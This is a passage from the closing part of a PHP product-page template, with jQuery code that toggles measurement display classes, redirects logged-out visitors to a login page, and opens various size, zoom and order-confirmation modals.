                $("#12").toggleClass("finishmeasurementvaluefront12_1");

                $("#13").toggleClass("finishmeasurementvaluefront13");
                $("#13").toggleClass("finishmeasurementvaluefront13_1");

                $("#14").toggleClass("finishmeasurementvaluefront14");
                $("#14").toggleClass("finishmeasurementvaluefront14_1");

                $("#15").toggleClass("finishmeasurementvalueback15");
                $("#15").toggleClass("finishmeasurementvalueback15_1");

                $("#16").toggleClass("finishmeasurementvalueback16");
                $("#16").toggleClass("finishmeasurementvalueback16_1");

                $("#17").toggleClass("finishmeasurementvalueback17");
                $("#17").toggleClass("finishmeasurementvalueback17_1");

                $("#18").toggleClass("finishmeasurementvalueback18");
                $("#18").toggleClass("finishmeasurementvalueback18_1");

                $("#19").toggleClass("finishmeasurementvalueback19");
                $("#19").toggleClass("finishmeasurementvalueback19_1");

                $("#20").toggleClass("finishmeasurementvalueback20");
                $("#20").toggleClass("finishmeasurementvalueback20_1");

                $("#21").toggleClass("finishmeasurementvalueback21");
                $("#21").toggleClass("finishmeasurementvalueback21_1");

                $("#22").toggleClass("finishmeasurementvalueback22");
                $("#22").toggleClass("finishmeasurementvalueback22_1");

                $("#23").toggleClass("finishmeasurementvalueback23");
                $("#23").toggleClass("finishmeasurementvalueback23_1");

                $("#24").toggleClass("finishmeasurementvalueback24");
                $("#24").toggleClass("finishmeasurementvalueback24_1");

                $("#25").toggleClass("finishmeasurementvalueback25");
                $("#25").toggleClass("finishmeasurementvalueback25_1");

                $("#26").toggleClass("finishmeasurementvalueback26");
                $("#26").toggleClass("finishmeasurementvalueback26_1");

                $("#27").toggleClass("finishmeasurementvalueback27");
                $("#27").toggleClass("finishmeasurementvalueback27_1");

                $("#28").toggleClass("finishmeasurementvalueback28");
                $("#28").toggleClass("finishmeasurementvalueback28_1");

                $("#29").toggleClass("finishmeasurementvaluefront29");
                $("#29").toggleClass("finishmeasurementvaluefront29_1");

                $("#doublewidth").toggleClass("finishmeasurementvaluedoublewidth");
                $("#doublewidth").toggleClass("finishmeasurementvaluedoublewidth_1");



            });
        });
    </script>
    <script>
        $('#qaFormDiv').click(function() {
            if ('<?php echo $visitor_no ?>' == 0) {
                window.location.href = "Login.php?location=productpage";
            } else {
                $('#qa_form').toggle();
            }
        });
    </script>
    <script>
        $(function() {
            // Attach Button click event listener
            $(".size").click(function() {
                $("#myModal_register").modal("show");
            });
            $("#zoom-modal").click(function() {
                $('#myModal_register9').modal('show');
            });
        });
    </script>
    <script>
        $("#confirm-button").click(function() {
            $('#modal_confirm1').modal('show');
        });
    </script>


    <script>
        $(document).ready(function() {
            $('#soldForm').on('submit', function(e) {
                $('#modal_currierconfirm').modal('show');
                e.preventDefault();
            });
        });
    </script>

    <script>
        $(document).ready(function() {
            $('#buyerbtn2txt').click(function(e) {
                $('#modal_recivedconfirm').modal('show');
                e.preventDefault();
            });
        });
    </script>

    <script>
        $(document).ready(function() {
            $("#size-tb").click(function() {
                $('#myModal_register5').modal('show');
            });
        });
    </script>

    <script>
        $(document).ready(function() {
            $("#size-modal").click(function() {
              
                $('#myModal_dimension').modal('show');
            });
        });
    </script>
</body>

</html>